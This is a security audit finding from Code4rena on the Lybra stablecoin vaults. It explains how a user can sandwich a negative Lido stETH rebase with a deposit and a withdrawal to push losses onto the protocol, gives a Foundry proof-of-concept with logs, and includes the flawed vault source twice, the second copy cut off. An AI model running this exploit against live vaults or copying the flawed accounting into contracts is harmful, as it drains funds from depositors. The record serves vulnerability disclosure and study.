{
  "Title": "[M-02] Exploiter can avoid negative Lido rebases stealing funds from EUSD vaults",
  "Content": "\nLybra keeps the exact amount of collateral as deposited ignoring any lido rebases.\n\n<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L79><br>\n<https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L103>\n\nThat allows malicious users to sandwich negative rebase transactions with depositing and withdrawing their stETH saving the exact amount as before negative rebase. The user can wait for 3 days or have a fee discount using `rigidRedemption` of self, which it makes applicable to a fee `(safeCollateralRatio - 100) / safeCollateralRatio * redemptionFee` part of the deposit.\n\n### Impact\n\nThe protocol will have additional losses in that case because the negative rebase decreases the cost of stETH share and the protocol withdraws the same amount of stETH as deposited to the malicious user, transferring more shares than deposited.\n\n### Proof of Concept\n\nShould be launched with mainnet fork:\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {LybraProxy} from \"@lybra/Proxy/LybraProxy.sol\";\nimport {LybraProxyAdmin} from \"@lybra/Proxy/LybraProxyAdmin.sol\";\n// import {AdminTimelock} from \"@lybra/governance/AdminTimelock.sol\";\nimport {GovernanceTimelock} from \"@lybra/governance/GovernanceTimelock.sol\";\n// import {LybraWBETHVault} from \"@lybra/pools/LybraWbETHVault.sol\";\nimport {esLBR} from \"@lybra/token/esLBR.sol\";\nimport {LybraWstETHVault} from \"@lybra/pools/LybraWstETHVault.sol\";\n// import {LybraRETHVault} from \"@lybra/pools/LybraRETHVault.sol\";\n// import {PeUSD} from \"@lybra/token/PeUSD.sol\";\nimport {esLBRBoost} from \"@lybra/miner/esLBRBoost.sol\";\nimport {LBR} from \"@lybra/token/LBR.sol\";\nimport {LybraStETHDepositVault} from \"@lybra/pools/LybraStETHVault.sol\";\n// import {StakingRewardsV2} from \"@lybra/miner/stakerewardV2pool.sol\";\n// import {LybraGovernance} from \"@lybra/governance/LybraGovernance.sol\";\nimport {PeUSDMainnet} from \"@lybra/token/PeUSDMainnetStableVision.sol\";\nimport {ProtocolRewardsPool} from \"@lybra/miner/ProtocolRewardsPool.sol\";\n// import {EUSD} from \"@lybra/token/EUSD.sol\";\nimport {Configurator} from \"@lybra/configuration/LybraConfigurator.sol\";\nimport {EUSDMiningIncentives} from \"@lybra/miner/EUSDMiningIncentives.sol\";\n// import {LybraEUSDVaultBase} from \"@lybra/pools/base/LybraEUSDVaultBase.sol\";\n// import {LybraPeUSDVaultBase} from \"@lybra/pools/base/LybraPeUSDVaultBase.sol\";\nimport {mockChainlink} from \"@mocks/chainLinkMock.sol\";\nimport {stETHMock} from \"@mocks/stETHMock.sol\";\nimport {EUSDMock} from \"@mocks/mockEUSD.sol\";\nimport {mockCurve} from \"@mocks/mockCurve.sol\";\nimport {mockUSDC} from \"@mocks/mockUSDC.sol\";\nimport {mockLBRPriceOracle} from \"@mocks/mockLBRPriceOracle.sol\";\n\n/* remappings used\n@lybra=contracts/lybra/\n@mocks=contracts/mocks/\n */\ncontract LybraV2Test is Test {\n    address goerliEndPoint = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;\n\n    LybraProxy proxy;\n    LybraProxyAdmin admin;\n    // AdminTimelock timeLock;\n    GovernanceTimelock govTimeLock;\n    // LybraWbETHVault wbETHVault;\n    // esLBR lbr;\n    // LybraWstETHVault stETHVault;\n    mockChainlink oracle;\n    mockLBRPriceOracle lbrOracleMock;\n    esLBRBoost eslbrBoost;\n    mockUSDC usdc;\n    mockCurve curve;\n    Configurator configurator;\n    LBR lbr;\n    esLBR eslbr;\n    EUSDMock usd;\n    EUSDMiningIncentives eusdMiningIncentives;\n    ProtocolRewardsPool rewardsPool;\n    LybraStETHDepositVault stETHVault;\n    PeUSDMainnet peUsdMainnet;\n    address owner = address(7);\n    // admins && executers of GovernanceTimelock\n    address[] govTimelockArr;\n    address stETHWhale = 0x1982b2F5814301d4e9a8b0201555376e62F82428;\n    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);\n    address exploiter = address(0x1);\n\n    function setUp() public {\n        vm.startPrank(owner);\n        oracle = new mockChainlink();\n        lbrOracleMock = new mockLBRPriceOracle();\n        govTimelockArr.push(owner);\n        govTimeLock = new GovernanceTimelock(\n            1,\n            govTimelockArr,\n            govTimelockArr,\n            owner\n        );\n        eslbrBoost = new esLBRBoost();\n        usdc = new mockUSDC();\n        curve = new mockCurve();\n        //  _dao , _curvePool\n        configurator = new Configurator(address(govTimeLock), address(curve));\n        // _config , _sharedDecimals , _lzEndpoint\n        lbr = new LBR(address(configurator), 8, goerliEndPoint);\n        // _config\n        eslbr = new esLBR(address(configurator));\n        // _config\n        usd = new EUSDMock(address(configurator));\n\n        configurator.initToken(address(usd), address(peUsdMainnet));\n        // _config, _boost, _etherOracle, _lbrOracle\n        eusdMiningIncentives = new EUSDMiningIncentives(\n            address(configurator),\n            address(eslbrBoost),\n            address(oracle),\n            address(lbrOracleMock)\n        );\n        // _config\n        rewardsPool = new ProtocolRewardsPool(address(configurator));\n        \n        // _config, _stETH, _oracle\n        stETHVault = new LybraStETHDepositVault(\n            address(configurator),\n            address(stETH),\n            address(oracle)\n        );\n        // _config, _sharedDecimals, _lzEndpoint\n        peUsdMainnet = new PeUSDMainnet(\n            address(configurator),\n            8,\n            goerliEndPoint\n        );\n\n        curve.setToken(address(usd), address(usdc));\n        configurator.setMintVault(address(stETHVault), true);\n        configurator.setPremiumTradingEnabled(true);\n        configurator.setMintVaultMaxSupply(\n            address(stETHVault),\n            10_000_000_000 ether\n        );\n        configurator.setBorrowApy(address(stETHVault), 200);\n        configurator.setEUSDMiningIncentives(address(eusdMiningIncentives));\n        eusdMiningIncentives.setToken(address(lbr), address(eslbr));\n        rewardsPool.setTokenAddress(\n            address(eslbr),\n            address(lbr),\n            address(eslbrBoost)\n        );\n\n        // Missing configurator.initEUSD(this.EUSDMock.address) as initEUSD in configurator does not exist.\n        // And it's not same as initToken. \n        vm.stopPrank();\n\n        vm.startPrank(stETHWhale);\n        stETH.approve(address(stETHVault), 1_000_000e18);\n        stETHVault.depositAssetToMint(100_000e18, 0);\n        stETH.transfer(exploiter, 1000e18);\n        vm.stopPrank();\n    }\n    \n    function negativeRebaseLido() internal {\n        bytes32 BUFFERED_ETHER_POSITION =\n            0xed310af23f61f96daefbcd140b306c0bdbf8c178398299741687b90e794772b0; // keccak256(\"lido.Lido.bufferedEther\");\n        vm.store(address(stETH), BUFFERED_ETHER_POSITION, bytes32(0));\n    }\n\n    function testV2AvoidingRebaseLossesWithRigid() public {\n        console.log(\"lybra balance before rebase: \", stETH.balanceOf(address(stETHVault)));\n        uint256 exploiterBalance = stETH.balanceOf(exploiter);\n        vm.startPrank(exploiter);\n        stETH.approve(address(stETHVault), exploiterBalance);\n        console.log(\"exploiter balance before rebase: \", stETH.balanceOf(exploiter));\n        uint256 toBorrow = exploiterBalance * oracle.fetchPrice() * 100 / configurator.getSafeCollateralRatio(address(stETHVault));\n        stETHVault.depositAssetToMint(exploiterBalance, toBorrow);\n        \n        negativeRebaseLido();\n        \n        configurator.becomeRedemptionProvider(true);\n        stETHVault.rigidRedemption(exploiter, toBorrow);\n        stETHVault.withdraw(exploiter, stETHVault.depositedAsset(exploiter));\n        console.log(\"exploiter balance after rebase: \", stETH.balanceOf(exploiter));\n        console.log(\"lybra balance after rebase: \", stETH.balanceOf(address(stETHVault)));\n        vm.stopPrank();\n    }\n\n        function testV2AvoidingRebaseLossesWaitFor3Days() public {\n        console.log(\"lybra balance before rebase: \", stETH.balanceOf(address(stETHVault)));\n        uint256 exploiterBalance = stETH.balanceOf(exploiter);\n        vm.startPrank(exploiter);\n        stETH.approve(address(stETHVault), exploiterBalance);\n        console.log(\"exploiter balance before rebase: \", stETH.balanceOf(exploiter));\n        stETHVault.depositAssetToMint(exploiterBalance, 0);\n        negativeRebaseLido();\n\n        vm.warp(block.timestamp + 3 days);\n        stETHVault.withdraw(exploiter, exploiterBalance);\n        console.log(\"exploiter balance after rebase: \", stETH.balanceOf(exploiter));\n        console.log(\"lybra balance after rebase: \", stETH.balanceOf(address(stETHVault)));\n        vm.stopPrank();\n    }\n\n    function testV2NormalRebaseLosses() public {\n        console.log(\"lybra balance before rebase: \", stETH.balanceOf(address(stETHVault)));\n        console.log(\"exploiter balance before rebase: \", stETH.balanceOf(exploiter));\n        negativeRebaseLido();\n        console.log(\"exploiter balance after rebase: \", stETH.balanceOf(exploiter));\n        console.log(\"lybra balance after rebase: \", stETH.balanceOf(address(stETHVault)));\n    }\n}\n```\nLogs:\n\n    Running 3 tests for test/LybraV2.sol:LybraV2Test\n    [PASS] testV2AvoidingRebaseLossesWaitFor3Days() (gas: 166689)\n    Logs:\n      lybra balance before rebase:  99999999999999999999999\n      exploiter balance before rebase:  1000000000002315874593\n      exploiter balance after rebase:  1000000000002315874593\n      lybra balance after rebase:  99904387650376337889471\n\n    [PASS] testV2AvoidingRebaseLossesWithRigid() (gas: 393436)\n    Logs:\n      lybra balance before rebase:  99999999999999999999999\n      exploiter balance before rebase:  1000000000002315874593\n      exploiter balance after rebase:  999621875002314998902\n      lybra balance after rebase:  99904765775376338765162\n\n    [PASS] testV2NormalRebaseLosses() (gas: 74877)\n    Logs:\n      lybra balance before rebase:  99999999999999999999999\n      exploiter balance before rebase:  1000000000002315874593\n      exploiter balance after rebase:  999053343075346752371\n      lybra balance after rebase:  99905334307303307011693\n\n</details>\n\n### Tools Used\n\nFoundry, mainnet forking.\n\n### Recommended Mitigation Steps\n\nNeed to handle losses in a different way, rather than just waiting for positive rebases to cover losses or deprecate rebase collateral vaults.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/931#issuecomment-1656227273):**\n > @LybraFinance - this one is slightly unique and I believe incorrectly duped.  Your response may be the same, but wanted to have you take a look. \n\n**[LybraFinance acknowledged and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/931#issuecomment-1656632844):**\n > We chose to ignore the negative change of rebase.\n\n**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/931#issuecomment-1662336385)**\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-06-lybra",
  "Code": [
    {
      "filename": "contracts/lybra/pools/base/LybraEUSDVaultBase.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.17;\n\nimport \"../../interfaces/IEUSD.sol\";\nimport \"../../interfaces/Iconfigurator.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface LbrStakingPool {\n    function notifyRewardAmount(uint256 amount) external;\n}\n\ninterface IPriceFeed {\n    function fetchPrice() external returns (uint256);\n}\n\nabstract contract LybraEUSDVaultBase {\n    IEUSD public immutable EUSD;\n    IERC20 public immutable collateralAsset;\n    Iconfigurator public immutable configurator;\n    uint256 public immutable badCollateralRatio = 150 * 1e18;\n    IPriceFeed immutable etherOracle;\n\n    uint256 public totalDepositedAsset;\n    uint256 public lastReportTime;\n    uint256 public poolTotalEUSDCirculation;\n\n    mapping(address => uint256) public depositedAsset;\n    mapping(address => uint256) borrowed;\n    uint8 immutable vaultType = 0;\n    uint256 public feeStored;\n    mapping(address => uint256) depositedTime;\n\n    event DepositEther(address indexed onBehalfOf, address asset, uint256 etherAmount, uint256 assetAmount, uint256 timestamp);\n\n    event DepositAsset(address indexed onBehalfOf, address asset, uint256 amount, uint256 timestamp);\n\n    event WithdrawAsset(address sponsor, address asset, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Mint(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Burn(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event LiquidationRecord(address provider, address keeper, address indexed onBehalfOf, uint256 eusdamount, uint256 liquidateEtherAmount, uint256 keeperReward, bool superLiquidation, uint256 timestamp);\n    event LSDValueCaptured(uint256 stETHAdded, uint256 payoutEUSD, uint256 discountRate, uint256 timestamp);\n    event RigidRedemption(address indexed caller, address indexed provider, uint256 eusdAmount, uint256 collateralAmount, uint256 timestamp);\n    event FeeDistribution(address indexed feeAddress, uint256 feeAmount, uint256 timestamp);\n\n    constructor(address _collateralAsset, address _etherOracle, address _configurator) {\n        collateralAsset = IERC20(_collateralAsset);\n        configurator = Iconfigurator(_configurator);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherOracle = IPriceFeed(_etherOracle);\n    }\n\n    /**\n     * @notice Allowing direct deposits of ETH, the pool may convert it into the corresponding collateral during the implementation.\n     * While depositing, it is possible to simultaneously mint eUSD for oneself.\n     * Emits a `DepositEther` event.\n     *\n     * Requirements:\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     * - msg.value Must be higher than 0.\n     */\n    function depositEtherToMint(uint256 mintAmount) external payable virtual;\n\n    /**\n     * @notice Deposit collateral and allow minting eUSD for oneself.\n     * Emits a `DepositAsset` event.\n     *\n     * Requirements:\n     * - `assetAmount` Must be higher than 0.\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     */\n    function depositAssetToMint(uint256 assetAmount, uint256 mintAmount) external virtual {\n        require(assetAmount >= 1 ether, \"Deposit should not be less than 1 stETH.\");\n\n        bool success = collateralAsset.transferFrom(msg.sender, address(this), assetAmount);\n        require(success, \"TF\");\n\n        totalDepositedAsset += assetAmount;\n        depositedAsset[msg.sender] += assetAmount;\n        depositedTime[msg.sender] = block.timestamp;\n\n        if (mintAmount > 0) {\n            _mintEUSD(msg.sender, msg.sender, mintAmount, getAssetPrice());\n        }\n        emit DepositAsset(msg.sender, address(collateralAsset), assetAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Withdraw collateral assets to an address\n     * Emits a `WithdrawEther` event.\n     *\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     *\n     * @dev Withdraw stETH. Check user’s collateral ratio after withdrawal, should be higher than `safeCollateralRatio`\n     */\n    function withdraw(address onBehalfOf, uint256 amount) external virtual {\n        require(onBehalfOf != address(0), \"TZA\");\n        require(amount > 0, \"ZERO_WITHDRAW\");\n        require(depositedAsset[msg.sender] >= amount, \"Withdraw amount exceeds deposited amount.\");\n        totalDepositedAsset -= amount;\n        depositedAsset[msg.sender] -= amount;\n\n        uint256 withdrawal = checkWithdrawal(msg.sender, amount);\n\n        collateralAsset.transfer(onBehalfOf, withdrawal);\n        if (borrowed[msg.sender] > 0) {\n            _checkHealth(msg.sender, getAssetPrice());\n        }\n        emit WithdrawAsset(msg.sender, address(collateralAsset), onBehalfOf, withdrawal, block.timestamp);\n    }\n\n    function checkWithdrawal(address user, uint256 amount) internal view returns (uint256 withdrawal) {\n        withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000;\n    }\n\n    /**\n     * @notice The mint amount number of EUSD is minted to the address\n     * Emits a `Mint` event.\n     *\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0. Individual mint amount shouldn't surpass 10% when the circulation reaches 10_000_000\n     */\n    function mint(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"MINT_TO_THE_ZERO_ADDRESS\");\n        require(amount > 0, \"ZERO_MINT\");\n        _mintEUSD(msg.sender, onBehalfOf, amount, getAssetPrice());\n    }\n\n    /**\n     * @notice Burn the amount of EUSD and payback the amount of minted EUSD\n     * Emits a `Burn` event.\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     * @dev Calling the internal`_repay`function.\n     */\n    function burn(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"BURN_TO_THE_ZERO_ADDRESS\");\n        _repay(msg.sender, onBehalfOf, amount);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is above 150%, Keeper liquidates borrowers whose collateral ratio is below badCollateralRatio, using EUSD provided by Liquidation Provider.\n     *\n     * Requirements:\n     * - onBehalfOf Collateral Ratio should be below badCollateralRatio\n     * - collateralAmount should be less than 50% of collateral\n     * - provider should authorize Lybra to utilize EUSD\n     * @dev After liquidation, borrower's debt is reduced by collateralAmount * etherPrice, collateral is reduced by the collateralAmount corresponding to 110% of the value. Keeper gets keeperRatio / 110 of Liquidation Reward and Liquidator gets the remaining stETH.\n     */\n    function liquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < badCollateralRatio, \"Borrowers collateral ratio should below badCollateralRatio\");\n\n        require(assetAmount * 2 <= depositedAsset[onBehalfOf], \"a max of 50% collateral can be liquidated\");\n        require(EUSD.allowance(provider, address(this)) > 0, \"provider should authorize to provide liquidation EUSD\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n\n        _repay(provider, onBehalfOf, eusdAmount);\n        uint256 reducedAsset = (assetAmount * 11) / 10;\n        totalDepositedAsset -= reducedAsset;\n        depositedAsset[onBehalfOf] -= reducedAsset;\n        uint256 reward2keeper;\n        if (provider == msg.sender) {\n            collateralAsset.transfer(msg.sender, reducedAsset);\n        } else {\n            reward2keeper = (reducedAsset * configurator.vaultKeeperRatio(address(this))) / 110;\n            collateralAsset.transfer(provider, reducedAsset - reward2keeper);\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, reducedAsset, reward2keeper, false, block.timestamp);\n    }\n\n    /**\n     * @notice When overallCollateralRatio is below badCollateralRatio, borrowers with collateralRatio below 125% could be fully liquidated.\n     * Emits a `LiquidationRecord` event.\n     *\n     * Requirements:\n     * - Current overallCollateralRatio should be below badCollateralRatio\n     * - `onBehalfOf`collateralRatio should be below 125%\n     * @dev After Liquidation, borrower's debt is reduced by collateralAmount * etherPrice, deposit is reduced by collateralAmount * borrower's collateralRatio. Keeper gets a liquidation reward of `keeperRatio / borrower's collateralRatio\n     */\n    function superLiquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {\n        uint256 assetPrice = getAssetPrice();\n        require((totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, \"overallCollateralRatio should below 150%\");\n        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];\n        require(onBehalfOfCollateralRatio < 125 * 1e18, \"borrowers collateralRatio should below 125%\");\n        require(assetAmount <= depositedAsset[onBehalfOf], \"total of collateral can be liquidated at most\");\n        uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;\n        if (onBehalfOfCollateralRatio >= 1e20) {\n            eusdAmount = (eusdAmount * 1e20) / onBehalfOfCollateralRatio;\n        }\n        require(EUSD.allowance(provider, address(this)) >= eusdAmount, \"provider should authorize to provide liquidation EUSD\");\n\n        _repay(provider, onBehalfOf, eusdAmount);\n\n        totalDepositedAsset -= assetAmount;\n        depositedAsset[onBehalfOf] -= assetAmount;\n        uint256 reward2keeper;\n        if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) {\n            reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio;\n            collateralAsset.transfer(msg.sender, reward2keeper);\n        }\n        collateralAsset.transfer(provider, assetAmount - reward2keeper);\n\n        emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, assetAmount, reward2keeper, true, block.timestamp);\n    }\n\n    /**\n     * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism.\n     * Emits a `LSDistribution` event.\n     *\n     * *Requirements:\n     * - stETH balance in the contract cannot be less than totalDepositedAsset after exchange.\n     * @dev Income is used to cover accumulated Service Fee first.\n     */\n    function excessIncomeDistribution(uint256 payAmount) external virtual;\n\n    /**\n     * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH\n     * Emits a `RigidRedemption` event.\n     *\n     * *Requirements:\n     * - `provider` must be a Redemption Provider\n     * - `provider`debt must equal to or above`eusdAmount`\n     * @dev Service Fee for rigidRedemption `redemptionFee` is set to 0.5% by default, can be revised by DAO.\n     */\n    function rigidRedemption(address provider, uint256 eusdAmount) external virtual {\n        require(configurator.isRedemptionProvider(provider), \"provider is not a RedemptionProvider\");\n        require(borrowed[provider] >= eusdAmount, \"eusdAmount cannot surpass providers debt\");\n        uint256 assetPrice = getAssetPrice();\n        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];\n        require(providerCollateralRatio >= 100 * 1e18, \"provider's collateral ratio should more than 100%\");\n        _repay(msg.sender, provider, eusdAmount);\n        uint256 collateralAmount = (((eusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;\n        depositedAsset[provider] -= collateralAmount;\n        totalDepositedAsset -= collateralAmount;\n        collateralAsset.transfer(msg.sender, collateralAmount);\n        emit RigidRedemption(msg.sender, provider, eusdAmount, collateralAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Mints eUSD tokens for a user.\n     * @param _provider The provider's address.\n     * @param _onBehalfOf The user's address.\n     * @param _mintAmount The amount of eUSD tokens to be minted.\n     * @param _assetPrice The current collateral asset price.\n     * @dev Mints eUSD tokens for the specified user, updates the total supply and borrowed balance,\n     * refreshes the mint reward for the provider, checks the health of the provider,\n     * and emits a Mint event.\n     * Requirements:\n     * The total supply plus mint amount must not exceed the maximum supply allowed for the vault.\n     * The provider must have sufficient borrowing capacity to mint the specified amount.\n     */\n    function _mintEUSD(address _provider, address _onBehalfOf, uint256 _mintAmount, uint256 _assetPrice) internal virtual {\n        require(poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), \"ESL\");\n        try configurator.refreshMintReward(_provider) {} catch {}\n        borrowed[_provider] += _mintAmount;\n\n        EUSD.mint(_onBehalfOf, _mintAmount);\n        _saveReport();\n        poolTotalEUSDCirculation += _mintAmount;\n        _checkHealth(_provider, _assetPrice);\n        emit Mint(msg.sender, _onBehalfOf, _mintAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Burn _provideramount EUSD to payback minted EUSD for _onBehalfOf.\n     *\n     * @dev Refresh LBR reward before reducing providers debt. Refresh Lybra generated service fee before reducing totalEUSDCirculation.\n     */\n    function _repay(address _provider, address _onBehalfOf, uint256 _amount) internal virtual {\n        uint256 amount = borrowed[_onBehalfOf] >= _amount ? _amount : borrowed[_onBehalfOf];\n\n        EUSD.burn(_provider, amount);\n        try configurator.refreshMintReward(_onBehalfOf) {} catch {}\n\n        borrowed[_onBehalfOf] -= amount;\n        _saveReport();\n        poolTotalEUSDCirculation -= amount;\n        emit Burn(_provider, _onBehalfOf, amount, block.timestamp);\n    }\n\n    /**\n     * @dev Get USD value of current collateral asset and minted EUSD through price oracle / Collateral asset USD value must higher than safe Collateral Ratio.\n     */\n    function _checkHealth(address _user, uint256 _assetPrice) internal view {\n        if (((depositedAsset[_user] * _assetPrice * 100) / borrowed[_user]) < configurator.getSafeCollateralRatio(address(this))) revert(\"collateralRatio is Below safeCollateralRatio\");\n    }\n\n    function _saveReport() internal {\n        feeStored += _newFee();\n        lastReportTime = block.timestamp;\n    }\n\n    function _newFee() internal view returns (uint256) {\n        return (poolTotalEUSDCirculation * configurator.vaultMintFeeApy(address(this)) * (block.timestamp - lastReportTime)) / (86400 * 365) / 10000;\n    }\n\n    /**\n     * @dev Return USD value of current ETH through Liquity PriceFeed Contract.\n     */\n    function _etherPrice() internal returns (uint256) {\n        return etherOracle.fetchPrice();\n    }\n\n    function getBorrowedOf(address user) external view returns (uint256) {\n        return borrowed[user];\n    }\n\n    function getPoolTotalEUSDCirculation() external view returns (uint256) {\n        return poolTotalEUSDCirculation;\n    }\n\n    function getAsset() external view virtual returns (address) {\n        return address(collateralAsset);\n    }\n\n    function getVaultType() external pure returns (uint8) {\n        return vaultType;\n    }\n\n    function getAssetPrice() public virtual returns (uint256);\n}"
    },
    {
      "filename": "contracts/lybra/pools/base/LybraEUSDVaultBase.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.17;\n\nimport \"../../interfaces/IEUSD.sol\";\nimport \"../../interfaces/Iconfigurator.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface LbrStakingPool {\n    function notifyRewardAmount(uint256 amount) external;\n}\n\ninterface IPriceFeed {\n    function fetchPrice() external returns (uint256);\n}\n\nabstract contract LybraEUSDVaultBase {\n    IEUSD public immutable EUSD;\n    IERC20 public immutable collateralAsset;\n    Iconfigurator public immutable configurator;\n    uint256 public immutable badCollateralRatio = 150 * 1e18;\n    IPriceFeed immutable etherOracle;\n\n    uint256 public totalDepositedAsset;\n    uint256 public lastReportTime;\n    uint256 public poolTotalEUSDCirculation;\n\n    mapping(address => uint256) public depositedAsset;\n    mapping(address => uint256) borrowed;\n    uint8 immutable vaultType = 0;\n    uint256 public feeStored;\n    mapping(address => uint256) depositedTime;\n\n    event DepositEther(address indexed onBehalfOf, address asset, uint256 etherAmount, uint256 assetAmount, uint256 timestamp);\n\n    event DepositAsset(address indexed onBehalfOf, address asset, uint256 amount, uint256 timestamp);\n\n    event WithdrawAsset(address sponsor, address asset, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Mint(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event Burn(address sponsor, address indexed onBehalfOf, uint256 amount, uint256 timestamp);\n    event LiquidationRecord(address provider, address keeper, address indexed onBehalfOf, uint256 eusdamount, uint256 liquidateEtherAmount, uint256 keeperReward, bool superLiquidation, uint256 timestamp);\n    event LSDValueCaptured(uint256 stETHAdded, uint256 payoutEUSD, uint256 discountRate, uint256 timestamp);\n    event RigidRedemption(address indexed caller, address indexed provider, uint256 eusdAmount, uint256 collateralAmount, uint256 timestamp);\n    event FeeDistribution(address indexed feeAddress, uint256 feeAmount, uint256 timestamp);\n\n    constructor(address _collateralAsset, address _etherOracle, address _configurator) {\n        collateralAsset = IERC20(_collateralAsset);\n        configurator = Iconfigurator(_configurator);\n        EUSD = IEUSD(configurator.getEUSDAddress());\n        etherOracle = IPriceFeed(_etherOracle);\n    }\n\n    /**\n     * @notice Allowing direct deposits of ETH, the pool may convert it into the corresponding collateral during the implementation.\n     * While depositing, it is possible to simultaneously mint eUSD for oneself.\n     * Emits a `DepositEther` event.\n     *\n     * Requirements:\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     * - msg.value Must be higher than 0.\n     */\n    function depositEtherToMint(uint256 mintAmount) external payable virtual;\n\n    /**\n     * @notice Deposit collateral and allow minting eUSD for oneself.\n     * Emits a `DepositAsset` event.\n     *\n     * Requirements:\n     * - `assetAmount` Must be higher than 0.\n     * - `mintAmount` Send 0 if doesn't mint EUSD\n     */\n    function depositAssetToMint(uint256 assetAmount, uint256 mintAmount) external virtual {\n        require(assetAmount >= 1 ether, \"Deposit should not be less than 1 stETH.\");\n\n        bool success = collateralAsset.transferFrom(msg.sender, address(this), assetAmount);\n        require(success, \"TF\");\n\n        totalDepositedAsset += assetAmount;\n        depositedAsset[msg.sender] += assetAmount;\n        depositedTime[msg.sender] = block.timestamp;\n\n        if (mintAmount > 0) {\n            _mintEUSD(msg.sender, msg.sender, mintAmount, getAssetPrice());\n        }\n        emit DepositAsset(msg.sender, address(collateralAsset), assetAmount, block.timestamp);\n    }\n\n    /**\n     * @notice Withdraw collateral assets to an address\n     * Emits a `WithdrawEther` event.\n     *\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     *\n     * @dev Withdraw stETH. Check user’s collateral ratio after withdrawal, should be higher than `safeCollateralRatio`\n     */\n    function withdraw(address onBehalfOf, uint256 amount) external virtual {\n        require(onBehalfOf != address(0), \"TZA\");\n        require(amount > 0, \"ZERO_WITHDRAW\");\n        require(depositedAsset[msg.sender] >= amount, \"Withdraw amount exceeds deposited amount.\");\n        totalDepositedAsset -= amount;\n        depositedAsset[msg.sender] -= amount;\n\n        uint256 withdrawal = checkWithdrawal(msg.sender, amount);\n\n        collateralAsset.transfer(onBehalfOf, withdrawal);\n        if (borrowed[msg.sender] > 0) {\n            _checkHealth(msg.sender, getAssetPrice());\n        }\n        emit WithdrawAsset(msg.sender, address(collateralAsset), onBehalfOf, withdrawal, block.timestamp);\n    }\n\n    function checkWithdrawal(address user, uint256 amount) internal view returns (uint256 withdrawal) {\n        withdrawal = block.timestamp - 3 days >= depositedTime[user] ? amount : (amount * 999) / 1000;\n    }\n\n    /**\n     * @notice The mint amount number of EUSD is minted to the address\n     * Emits a `Mint` event.\n     *\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0. Individual mint amount shouldn't surpass 10% when the circulation reaches 10_000_000\n     */\n    function mint(address onBehalfOf, uint256 amount) external {\n        require(onBehalfOf != address(0), \"MINT_TO_THE_ZERO_ADDRESS\");\n        require(amount > 0, \"ZERO_MINT\");\n        _mintEUSD(msg.sender, onBehalfOf, amount, getAssetPrice());\n    }\n\n    /**\n     * @notice Burn the amount of EUSD and payback the amount of minted EUSD\n     * Emits a `Burn` event.\n     * Requirements:\n     * - `onBehalfOf` cannot be the zero address.\n     * - `amount` Must be higher than 0.\n     * @dev Calling the 